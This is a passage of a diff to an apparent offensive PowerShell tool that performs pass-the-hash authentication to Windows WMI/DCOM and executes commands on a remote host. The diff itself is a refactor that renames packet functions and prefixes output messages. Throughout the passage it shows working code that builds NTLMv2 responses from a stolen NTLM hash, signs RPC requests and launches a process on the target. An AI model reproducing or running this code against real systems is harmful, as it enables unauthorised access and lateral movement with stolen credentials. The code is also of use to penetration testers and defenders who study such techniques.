         $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
         $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
-        $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
-        $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
+        $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
+        $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
         $WMI_session_ID = $WMI_client_receive[44..51]
         $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
         $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
@@ -614,14 +613,10 @@ if($WMI_client_init.Connected)
         $auth_domain = $Domain
         $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
         $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
-        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
-        $auth_domain_length = $auth_domain_length[0,1]
-        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
-        $auth_domain_length = $auth_domain_length[0,1]
-        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
-        $auth_username_length = $auth_username_length[0,1]
-        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
-        $auth_hostname_length = $auth_hostname_length[0,1]
+        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
+        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
+        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
+        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
         $auth_domain_offset = 0x40,0x00,0x00,0x00
         $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
         $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
@@ -650,8 +645,7 @@ if($WMI_client_init.Connected)
         $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
         $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
         $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
-        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
-        $NTLMv2_response_length = $NTLMv2_response_length[0,1]
+        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
         $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
         $WMI_session_key_length = 0x00,0x00
         $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2
@@ -685,7 +679,7 @@ if($WMI_client_init.Connected)
                                 $NTLMv2_response
 
         $assoc_group = $WMI_client_receive[20..23]
-        $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
+        $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -694,9 +688,9 @@ if($WMI_client_init.Connected)
         [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
         [Byte[]]$unused_buffer_bytes = $unused_buffer.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-        $packet_DCOM_remote_create_instance = Get-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
+        $packet_DCOM_remote_create_instance = New-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
         $DCOM_remote_create_instance = ConvertFrom-PacketOrderedDictionary $packet_DCOM_remote_create_instance
-        $packet_RPC = Get-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
+        $packet_RPC = New-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC + $DCOM_remote_create_instance
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -705,22 +699,22 @@ if($WMI_client_init.Connected)
 
         if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
         {
-            Write-Output "$output_username WMI access denied on $target_long"    
+            Write-Output "[-] $output_username WMI access denied on $target_long"    
         }
         elseif($WMI_client_receive[2] -eq 3)
         {
             $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
             $error_code = $error_code -replace "-",""
-            Write-Output "Error code 0x$error_code"
+            Write-Output "[-] Error code 0x$error_code"
         }
         elseif($WMI_client_receive[2] -eq 2 -and !$WMI_execute)
         {
-            Write-Output "$output_username accessed WMI on $target_long"
+            Write-Output "[+] $output_username accessed WMI on $target_long"
         }
         elseif($WMI_client_receive[2] -eq 2)
         {
             
-            Write-Verbose "$output_username accessed WMI on $target_long"
+            Write-Verbose "[+] $output_username accessed WMI on $target_long"
 
             if($target_short -eq '127.0.0.1')
             {
@@ -757,7 +751,7 @@ if($WMI_client_init.Connected)
 
             if($target_long -cne $target_short)
             {
-                Write-Verbose "Using $target_short for random port extraction"
+                Write-Verbose "[*] Using $target_short for random port extraction"
             }
 
             if($target_index -gt 0)
@@ -793,7 +787,7 @@ if($WMI_client_init.Connected)
             if($WMI_random_port)
             {
 
-                Write-Verbose "Connecting to $target_long`:$WMI_random_port_int"
+                Write-Verbose "[*] Connecting to $target_long`:$WMI_random_port_int"
 
                 try
                 {
@@ -801,29 +795,29 @@ if($WMI_client_init.Connected)
                 }
                 catch
                 {
-                    Write-Output "$target_long`:$WMI_random_port_int did not respond"
+                    Write-Output "[-] $target_long`:$WMI_random_port_int did not respond"
                 }
 
             }
             else
             {
-                Write-Output "Random port extraction failure"
+                Write-Output "[-] Random port extraction failure"
             }
 
         }
         else
         {
-            Write-Output "Something went wrong"
+            Write-Output "[-] Something went wrong"
         }
 
         if($WMI_client_random_port.Connected)
         {
             $WMI_client_random_port_stream = $WMI_client_random_port.GetStream()
-            $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
-            $packet_RPC["RPCBind_FragLength"] = 0xd0,0x00
-            $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
-            $packet_RPC["RPCBind_AuthLevel"] = 0x04
-            $packet_RPC["RPCBind_NegotiateFlags"] = 0x97,0x82,0x08,0xa2
+            $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
+            $packet_RPC["FragLength"] = 0xd0,0x00
+            $packet_RPC["AuthLength"] = 0x28,0x00
+            $packet_RPC["AuthLevel"] = 0x04
+            $packet_RPC["NegotiateFlags"] = 0x97,0x82,0x08,0xa2
             $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
             $WMI_client_send = $RPC
             $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -834,27 +828,23 @@ if($WMI_client_init.Connected)
             $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
             $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
             $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
-            $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
-            $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
+            $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
+            $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
             $WMI_session_ID = $WMI_client_receive[44..51]
             $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
             $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
             $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
             $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
             $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-            $auth_hostname = (get-childitem -path env:computername).Value
+            $auth_hostname = (Get-ChildItem -path env:computername).Value
             $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
             $auth_domain = $Domain
             $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
             $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
-            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
-            $auth_domain_length = $auth_domain_length[0,1]
-            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
-            $auth_domain_length = $auth_domain_length[0,1]
-            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
-            $auth_username_length = $auth_username_length[0,1]
-            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
-            $auth_hostname_length = $auth_hostname_length[0,1]
+            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
+            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
+            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
+            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
             $auth_domain_offset = 0x40,0x00,0x00,0x00
             $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
             $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
@@ -892,8 +882,7 @@ if($WMI_client_init.Connected)
             $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
             $client_signing_key = $MD5.ComputeHash($session_base_key + $client_signing_constant)
             $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
-            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
-            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
+            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
             $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
             $WMI_session_key_length = 0x00,0x00
             $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2
@@ -929,39 +918,39 @@ if($WMI_client_init.Connected)
 
             $HMAC_MD5.key = $client_signing_key
             [Byte[]]$sequence_number = 0x00,0x00,0x00,0x00
-            $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
-            $packet_RPC["RPCAUTH3_CallID"] = 0x02,0x00,0x00,0x00
-            $packet_RPC["RPCAUTH3_AuthLevel"] = 0x04
+            $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
+            $packet_RPC["CallID"] = 0x02,0x00,0x00,0x00
+            $packet_RPC["AuthLevel"] = 0x04
             $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
             $WMI_client_send = $RPC
             $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
             $WMI_client_random_port_stream.Flush()
-            $packet_RPC = Get-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
-            $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
-            $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier 4 0x04 $sequence_number
+            $packet_RPC = New-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
+            $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
+            $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier 4 0x04 $sequence_number
             $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
             $rem_query_interface = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
             $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
             $HMAC_MD5.key = $client_signing_key
             $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $rem_query_interface + $NTLMSSP_verifier[0..11])
             $RPC_signature = $RPC_signature[0..7]
-            $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
+            $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
             $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
             $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
             $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
             $WMI_client_random_port_stream.Flush()    
             $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
-            $WMI_client_stage = 'exit'
+            $WMI_client_stage = 'Exit'
 
             if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
             {
-                Write-Output "$output_username WMI access denied on $target_long"   
+                Write-Output "[-] $output_username WMI access denied on $target_long"   
             }
             elseif($WMI_client_receive[2] -eq 3)
             {
                 $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                 $error_code = $error_code -replace "-",""
-                Write-Output "Failed with error code 0x$error_code"
+                Write-Output "[-] Failed with error code 0x$error_code"
             }
             elseif($WMI_client_receive[2] -eq 2)
             {
@@ -974,21 +963,21 @@ if($WMI_client_init.Connected)
             }
             else
             {
-                Write-Output "Something went wrong"
+                Write-Output "[-] Something went wrong"
             }
 
-            Write-Verbose "Attempting command execution"
+            Write-Verbose "[*] Attempting command execution"
             $request_split_index = 5500
 
-            :WMI_execute_loop while ($WMI_client_stage -ne 'exit')
+            :WMI_execute_loop while ($WMI_client_stage -ne 'Exit')
             {
 
                 if($WMI_client_receive[2] -eq 3)
                 {
                     $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                     $error_code = $error_code -replace "-",""
-                    Write-Output "Failed with error code 0x$error_code"
-                    $WMI_client_stage = 'exit'
+                    Write-Output "[-] Failed with error code 0x$error_code"
+                    $WMI_client_stage = 'Exit'
                 }
 
                 switch ($WMI_client_stage)
@@ -1026,7 +1015,7 @@ if($WMI_client_init.Connected)
 
                         }
 
-                        $packet_RPC = Get-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
+                        $packet_RPC = New-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
                         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                         $WMI_client_send = $RPC
                         $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -1143,7 +1132,7 @@ if($WMI_client_init.Connected)
                                 $OXID_index = $WMI_data.IndexOf($OXID)
                                 $OXID_bytes_index = $OXID_index / 2
                                 $IPID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
-                                $packet_rem_release = Get-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
+                                $packet_rem_release = New-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
                                 $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_release
                             }
 
@@ -1157,7 +1146,7 @@ if($WMI_client_init.Connected)
                                 $request_opnum = 0x03,0x00
                                 $request_UUID = $object_UUID
                                 $WMI_client_stage_next = 'Request'
-                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
+                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                 $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                             }
 
@@ -1171,7 +1160,7 @@ if($WMI_client_init.Connected)
                                 $request_opnum = 0x03,0x00
                                 $request_UUID = $object_UUID
                                 $WMI_client_stage_next = 'AlterContext'
-                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
+                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                 $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                             }
 
@@ -1227,16 +1216,11 @@ if($WMI_client_init.Connected)
                                 $request_context_ID = 0x04,0x00
                                 $request_opnum = 0x18,0x00
                                 $request_UUID = $IPID2
-                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)
-                                $stub_length = $stub_length[0,1]
-                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)
-                                $stub_length2 = $stub_length2[0,1]
-                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)
-                                $stub_length3 = $stub_length3[0,1]
-                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)
-                                $command_length = $command_length[0,1]
-                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)
-                                $command_length2 = $command_length2[0,1]
+                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)[0,1]
+                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)[0,1]
+                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)[0,1]
+                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)[0,1]
+                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)[0,1]
                                 [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
 
 
@@ -1427,19 +1411,19 @@ if($WMI_client_init.Connected)
 
                         }
 
-                        $packet_RPC = Get-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID
+                        $packet_RPC = New-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID
 
                         if($request_split)
                         {
-                            $packet_RPC["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($request_length)
+                            $packet_RPC["AllocHint"] = [System.BitConverter]::GetBytes($request_length)
                         }
 
-                        $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
+                        $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                         $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
                         $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                         $RPC_signature = $RPC_signature[0..7]
-                        $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
+                        $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
                         $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                         $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                         $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -1470,15 +1454,15 @@ if($WMI_client_init.Connected)
 
                         if($WMI_client_receive[1145] -ne 9)
                         { 
-                            $target_process_ID = DataLength2 1141 $WMI_client_receive
-                            Write-Output "Command executed with process ID $target_process_ID on $target_long"
+                            $target_process_ID = Get-UInt16DataLength 1141 $WMI_client_receive
+                            Write-Output "[+] Command executed with process ID $target_process_ID on $target_long"
                         }
                         else
                         {
-                            Write-Output "Process did not start, check your command"
+                            Write-Output "[-] Process did not start, check your command"
                         }
 
-                        $WMI_client_stage = 'exit'
+                        $WMI_client_stage = 'Exit'
                     }
 
                 }
